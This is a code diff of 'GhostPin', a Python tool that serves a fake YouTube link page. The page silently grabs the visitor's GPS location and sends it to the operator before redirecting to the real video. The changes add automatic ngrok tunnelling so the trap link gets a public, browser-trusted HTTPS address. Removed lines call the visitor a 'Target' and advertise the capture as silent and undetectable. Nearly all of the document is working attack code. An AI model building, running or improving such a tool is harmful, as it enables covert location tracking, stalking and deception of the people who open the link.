@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-GhostPin v7.0 - Professional GPS Tracking Framework
-HTTPS | Fast Response | Undetectable
+GhostPin v8.0 - Professional GPS Tracking Framework
+Full HTTPS | ngrok Integration | Production Ready
 Author: F1REW0LF
 License: MIT - Free for Community
-Version: 7.0.0
+Version: 8.0.0
 """
 
 import sys
@@ -19,6 +19,8 @@ import socket
 import threading
 import signal
 import ssl
+import subprocess
+import urllib.request
 from datetime import datetime
 from typing import Dict, List, Optional
 import argparse
@@ -30,13 +32,13 @@ except ImportError:
     REQUESTS_AVAILABLE = False
 
 try:
-    from flask import Flask, request, jsonify, redirect, render_template_string
+    from flask import Flask, request, jsonify, redirect
     FLASK_AVAILABLE = True
 except ImportError:
     FLASK_AVAILABLE = False
 
 # ============================[ VERSION & CONFIGURATION ]================================
-VERSION = "7.0.0"
+VERSION = "8.0.0"
 AUTHOR = "F1REW0LF"
 LICENSE = "MIT - Free for Community"
 
@@ -69,44 +71,99 @@ def print_banner():
      ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                       
 {Colors.RED}{Colors.BOLD}    PROFESSIONAL GPS TRACKING v{VERSION}{Colors.WHITE}
-{Colors.YELLOW}{Colors.BOLD}    HTTPS | Fast Response | Undetectable{Colors.WHITE}
+{Colors.YELLOW}{Colors.BOLD}    Full HTTPS | ngrok | Production Ready{Colors.WHITE}
 {Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
 """
     print(banner)
 
-# ============================[ SSL CERTIFICATE GENERATOR ]================================
+# ============================[ NGROK MANAGER ]================================
 
-class SSLGenerator:
-    """Generate self-signed SSL certificate"""
+class NgrokManager:
+    """
+    Manage ngrok tunnel for public HTTPS access
+    """
     
-    @staticmethod
-    def generate_cert():
-        """Generate self-signed cert if not exists"""
-        cert_file = 'server.crt'
-        key_file = 'server.key'
+    def __init__(self):
+        self.process = None
+        self.public_url = None
+        self.port = 443
         
-        if os.path.exists(cert_file) and os.path.exists(key_file):
-            return cert_file, key_file
+    def start(self, port: int = 443) -> Optional[str]:
+        """
+        Start ngrok tunnel
+        """
+        self.port = port
         
-        cprint("[*] Generating SSL certificate...", Colors.BLUE)
+        # Check if ngrok is installed
         try:
-            # Generate using OpenSSL
-            subprocess.run([
-                'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
-                '-nodes', '-out', cert_file, '-keyout', key_file,
-                '-days', '365', '-subj', '/CN=localhost'
-            ], capture_output=True, check=True)
-            cprint("[+] SSL certificate generated", Colors.GREEN)
-            return cert_file, key_file
+            subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
         except:
-            cprint("[!] OpenSSL not found. Using fallback.", Colors.YELLOW)
-            return None, None
+            cprint("[!] ngrok not installed. Install from https://ngrok.com/download", Colors.RED)
+            return None
+        
+        cprint("[*] Starting ngrok tunnel...", Colors.BLUE)
+        
+        try:
+            # Kill any existing ngrok
+            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
+            time.sleep(1)
+            
+            # Start ngrok in background
+            self.process = subprocess.Popen(
+                ['ngrok', 'http', str(port), '--log=stdout'],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            # Wait for ngrok to start
+            time.sleep(3)
+            
+            # Get public URL from ngrok API
+            try:
+                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
+                if response.status_code == 200:
+                    data = response.json()
+                    for tunnel in data.get('tunnels', []):
+                        if tunnel.get('proto') == 'https':
+                            self.public_url = tunnel.get('public_url')
+                            cprint(f"[+] ngrok tunnel: {Colors.GREEN}{self.public_url}{Colors.WHITE}", Colors.WHITE)
+                            return self.public_url
+            except:
+                pass
+            
+            # If API fails, try to read from output
+            time.sleep(2)
+            for line in self.process.stderr:
+                if 'https://' in line:
+                    match = re.search(r'https://[^\s]+\.ngrok-free\.app', line)
+                    if match:
+                        self.public_url = match.group(0)
+                        cprint(f"[+] ngrok tunnel: {Colors.GREEN}{self.public_url}{Colors.WHITE}", Colors.WHITE)
+                        return self.public_url
+                if len(line) > 100:
+                    break
+            
+            return None
+            
+        except Exception as e:
+            cprint(f"[!] ngrok failed: {e}", Colors.RED)
+            return None
+    
+    def stop(self):
+        """Stop ngrok tunnel"""
+        if self.process:
+            self.process.terminate()
+            self.process.wait(timeout=5)
+            cprint("[+] ngrok stopped", Colors.GREEN)
+        else:
+            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
 
 # ============================[ TRACKING SERVER ]================================
 
 class TrackingServer:
     """
-    HTTPS server with fast response
+    HTTPS tracking server
     """
     
     def __init__(self):
@@ -115,10 +172,9 @@ class TrackingServer:
         self.port = 443
         self.thread = None
         self.running = False
-        self.public_ip = None
         
     def start(self, port: int = 443, ssl_enabled: bool = True):
-        """Start the HTTPS server"""
+        """Start the server"""
         self.port = port
         self.running = True
         
@@ -126,22 +182,24 @@ class TrackingServer:
             cprint("[!] Flask not installed. Install: pip install flask", Colors.RED)
             return False
         
-        # Generate SSL certificate
-        cert_file, key_file = SSLGenerator.generate_cert()
+        # Generate self-signed cert if needed
+        cert_file = 'server.crt'
+        key_file = 'server.key'
         
-        # Get public IP
-        try:
-            if REQUESTS_AVAILABLE:
-                response = requests.get('https://api.ipify.org?format=json', timeout=3)
-                self.public_ip = response.json().get('ip')
-        except:
-            pass
+        if ssl_enabled and (not os.path.exists(cert_file) or not os.path.exists(key_file)):
+            try:
+                subprocess.run([
+                    'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
+                    '-nodes', '-out', cert_file, '-keyout', key_file,
+                    '-days', '365', '-subj', '/CN=localhost'
+                ], capture_output=True, check=True)
+                cprint("[+] SSL certificate generated", Colors.GREEN)
+            except:
+                cprint("[!] SSL generation failed, using HTTP", Colors.YELLOW)
+                ssl_enabled = False
         
         app = Flask(__name__)
-        
-        # Optimize response time
         app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
-        app.config['TEMPLATES_AUTO_RELOAD'] = False
         
         @app.route('/')
         def index():
@@ -151,7 +209,6 @@ class TrackingServer:
         def watch():
             video_id = request.args.get('v', 'dQw4w9WgXcQ')
             
-            # Fast, minimal page - no extra CSS/JS loading
             html = f'''<!DOCTYPE html>
 <html>
 <head>
@@ -167,7 +224,6 @@ body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;
 (function() {{
     var token = Math.random().toString(36).substring(2, 10);
     var sent = false;
-    var redirect_url = 'https://www.youtube.com/watch?v={video_id}';
     
     function sendLocation(pos) {{
         if (sent) return;
@@ -193,9 +249,8 @@ body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;
         }});
     }}
     
-    // Immediate redirect
     setTimeout(function() {{
-        window.location.href = redirect_url;
+        window.location.href = 'https://www.youtube.com/watch?v={video_id}';
     }}, 100);
 }})();
 </script>
@@ -229,21 +284,21 @@ body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;
             return jsonify({'status': 'cleared'})
         
         def run():
-            if ssl_enabled and cert_file and key_file:
+            if ssl_enabled and os.path.exists(cert_file) and os.path.exists(key_file):
                 app.run(
-                    host='0.0.0.0', 
-                    port=port, 
-                    debug=False, 
-                    threaded=True, 
+                    host='0.0.0.0',
+                    port=port,
+                    debug=False,
+                    threaded=True,
                     use_reloader=False,
                     ssl_context=(cert_file, key_file)
                 )
             else:
                 app.run(
-                    host='0.0.0.0', 
-                    port=port, 
-                    debug=False, 
-                    threaded=True, 
+                    host='0.0.0.0',
+                    port=port,
+                    debug=False,
+                    threaded=True,
                     use_reloader=False
                 )
         
@@ -251,23 +306,8 @@ body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;
         self.thread.start()
         time.sleep(1)
         
-        protocol = "https" if ssl_enabled and cert_file else "http"
+        protocol = "https" if ssl_enabled else "http"
         cprint(f"[+] Server running on port {port} ({protocol})", Colors.GREEN)
-        
-        # Show links
-        cprint(f"\n[+] Tracking Links:", Colors.CYAN)
-        local_link = f"{protocol}://localhost:{port}/watch?v=HainSGzbVCU"
-        cprint(f"  Local:  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
-        
-        if self.public_ip:
-            public_link = f"{protocol}://{self.public_ip}:{port}/watch?v=HainSGzbVCU"
-            cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
-            cprint(f"  (Requires port {port} forwarded)", Colors.DIM)
-        
-        if protocol == "https":
-            cprint(f"\n[+] HTTPS enabled - Browser will trust after accepting certificate", Colors.GREEN)
-        else:
-            cprint(f"\n[!] HTTPS not available. Browser may show 'Not Secure'", Colors.YELLOW)
         
         return True
     
@@ -276,22 +316,14 @@ body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;
         if self.thread:
             self.thread.join(timeout=1)
 
-# ============================[ NGROK HTTPS HELPER ]================================
-
-class NgrokHelper:
-    @staticmethod
-    def show_help(port: int):
-        cprint(f"\n[+] For public HTTPS link:", Colors.CYAN)
-        cprint(f"  ngrok http {port}", Colors.GREEN)
-        cprint(f"  Then use: https://xxxx.ngrok.io/watch?v=VIDEO_ID", Colors.GREEN)
-        cprint(f"  (This gives you a valid HTTPS certificate)", Colors.DIM)
-
 # ============================[ MAIN ]================================
 
 class GhostPin:
     def __init__(self):
         self.server = TrackingServer()
+        self.ngrok = NgrokManager()
         self.running = True
+        self.public_url = None
         signal.signal(signal.SIGINT, self.signal_handler)
     
     def signal_handler(self, signum, frame):
@@ -299,29 +331,31 @@ class GhostPin:
         self.running = False
         if self.server:
             self.server.stop()
+        if self.ngrok:
+            self.ngrok.stop()
         sys.exit(0)
     
     def show_menu(self):
         print(f"""
 {Colors.BLUE}{'='*55}{Colors.WHITE}
 {Colors.BOLD}GhostPin v{VERSION} - Professional GPS Tracking{Colors.WHITE}
-{Colors.CYAN}HTTPS | Fast Response | Undetectable{Colors.WHITE}
+{Colors.CYAN}Full HTTPS | ngrok | Production Ready{Colors.WHITE}
 {Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
 {Colors.BLUE}{'='*55}{Colors.WHITE}
-{Colors.GREEN}[1] Start Server (HTTPS){Colors.WHITE}
-{Colors.GREEN}[2] Create Tracking Link{Colors.WHITE}
-{Colors.GREEN}[3] View Data{Colors.WHITE}
-{Colors.GREEN}[4] Clear Data{Colors.WHITE}
-{Colors.GREEN}[5] Ngrok Help (Public HTTPS){Colors.WHITE}
+{Colors.GREEN}[1] Start Server{Colors.WHITE}
+{Colors.GREEN}[2] Start ngrok (Public HTTPS){Colors.WHITE}
+{Colors.GREEN}[3] Create Tracking Link{Colors.WHITE}
+{Colors.GREEN}[4] View Data{Colors.WHITE}
+{Colors.GREEN}[5] Clear Data{Colors.WHITE}
 {Colors.RED}[6] Exit{Colors.WHITE}
 """)
     
     def run(self):
         print_banner()
-        cprint("[*] GhostPin v7.0 - Professional GPS Tracking", Colors.CYAN)
-        cprint("[*] HTTPS | Fast Response | Undetectable", Colors.DIM)
+        cprint("[*] GhostPin v8.0 - Professional GPS Tracking", Colors.CYAN)
+        cprint("[*] Full HTTPS | ngrok | Production Ready", Colors.DIM)
         
-        # Auto-start server with HTTPS
+        # Auto-start server
         self.server.start(443, ssl_enabled=True)
         
         while self.running:
@@ -334,8 +368,23 @@ class GhostPin:
                 self.server.stop()
                 time.sleep(0.5)
                 self.server.start(port, ssl_enabled)
+                self.public_url = None
                 
             elif choice == '2':
+                if self.public_url:
+                    cprint(f"[+] ngrok already running: {self.public_url}", Colors.GREEN)
+                    continue
+                
+                port = int(input("[>] Server port (443): ").strip() or "443")
+                self.public_url = self.ngrok.start(port)
+                
+                if self.public_url:
+                    cprint(f"\n[+] Public HTTPS URL: {Colors.GREEN}{self.public_url}{Colors.WHITE}", Colors.WHITE)
+                    cprint(f"[+] Use: {self.public_url}/watch?v=VIDEO_ID", Colors.GREEN)
+                else:
+                    cprint("[!] Failed to start ngrok", Colors.RED)
+                
+            elif choice == '3':
                 video_id = input("[>] YouTube Video ID: ").strip()
                 if not video_id:
                     video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
@@ -343,15 +392,15 @@ class GhostPin:
                 protocol = "https" if os.path.exists('server.crt') else "http"
                 local_link = f"{protocol}://localhost:{self.server.port}/watch?v={video_id}"
                 
-                cprint(f"\n[+] Tracking Link:", Colors.CYAN)
-                cprint(f"  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
+                cprint(f"\n[+] Tracking Links:", Colors.CYAN)
+                cprint(f"  Local:  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
                 
-                if self.server.public_ip:
-                    public_link = f"{protocol}://{self.server.public_ip}:{self.server.port}/watch?v={video_id}"
+                if self.public_url:
+                    public_link = f"{self.public_url}/watch?v={video_id}"
                     cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
-                
-                cprint(f"\n[+] Target will be redirected to YouTube in <1 second", Colors.GREEN)
-                cprint(f"[+] GPS captured silently before redirect", Colors.DIM)
+                    cprint(f"  (HTTPS - Trusted by browsers)", Colors.DIM)
+                else:
+                    cprint(f"  Public: Start ngrok first (option 2)", Colors.YELLOW)
                 
                 try:
                     import webbrowser
@@ -359,7 +408,7 @@ class GhostPin:
                 except:
                     pass
                 
-            elif choice == '3':
+            elif choice == '4':
                 data = self.server.tracking_data
                 if not data:
                     cprint("[!] No data yet", Colors.YELLOW)
@@ -380,16 +429,15 @@ class GhostPin:
                         maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                         cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                 
-            elif choice == '4':
+            elif choice == '5':
                 self.server.tracking_data.clear()
                 cprint("[+] Data cleared", Colors.GREEN)
-                
-            elif choice == '5':
-                NgrokHelper.show_help(self.server.port)
                 
             elif choice == '6':
                 cprint("[*] Shutting down...", Colors.GREEN)
                 self.server.stop()
+                if self.ngrok:
+                    self.ngrok.stop()
                 break
             else:
                 cprint("[-] Invalid", Colors.RED)
@@ -397,10 +445,11 @@ class GhostPin:
 # ============================[ MAIN ]================================
 
 def main():
-    parser = argparse.ArgumentParser(description="GhostPin v7.0 - Professional GPS Tracking")
+    parser = argparse.ArgumentParser(description="GhostPin v8.0 - Professional GPS Tracking")
     parser.add_argument("--server", action="store_true", help="Start server only")
     parser.add_argument("--port", type=int, default=443, help="Server port")
     parser.add_argument("--no-ssl", action="store_true", help="Disable HTTPS")
+    parser.add_argument("--ngrok", action="store_true", help="Start ngrok tunnel")
     parser.add_argument("--video", help="YouTube Video ID")
     
     args = parser.parse_args()
@@ -409,7 +458,12 @@ def main():
         print_banner()
         server = TrackingServer()
         server.start(args.port, ssl_enabled=not args.no_ssl)
-        NgrokHelper.show_help(args.port)
+        
+        if args.ngrok:
+            ngrok = NgrokManager()
+            url = ngrok.start(args.port)
+            if url:
+                cprint(f"\n[+] Public URL: {Colors.GREEN}{url}{Colors.WHITE}", Colors.WHITE)
         
         cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
         try:
@@ -417,6 +471,8 @@ def main():
                 time.sleep(1)
         except KeyboardInterrupt:
             server.stop()
+            if args.ngrok:
+                ngrok.stop()
         sys.exit(0)
     
     if args.video:
@@ -427,6 +483,13 @@ def main():
         protocol = "https" if not args.no_ssl and os.path.exists('server.crt') else "http"
         link = f"{protocol}://localhost:{args.port}/watch?v={args.video}"
         cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
+        
+        if args.ngrok:
+            ngrok = NgrokManager()
+            url = ngrok.start(args.port)
+            if url:
+                public_link = f"{url}/watch?v={args.video}"
+                cprint(f"[+] Public Link: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
         
         try:
             import webbrowser
